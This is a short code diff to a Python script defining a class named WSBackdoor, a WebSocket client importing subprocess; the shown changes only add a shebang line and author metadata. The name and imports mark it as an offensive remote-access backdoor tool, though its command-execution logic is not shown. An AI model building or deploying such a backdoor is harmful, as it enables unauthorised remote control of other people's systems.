@@ -1,7 +1,10 @@
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 from ws4py.client.threadedclient import WebSocketClient
 import subprocess
 import optparse
+
+__author__ = "f47h3r - Chase Schultz"
 
 class WSBackdoor(WebSocketClient):
     
@@ -27,6 +30,7 @@ class WSBackdoor(WebSocketClient):
 
 if __name__ == '__main__':
     usage = __doc__
+    author = __author__
     version= "0.01"
     parser = optparse.OptionParser(usage, None, optparse.Option, version)
     parser.add_option('-p',
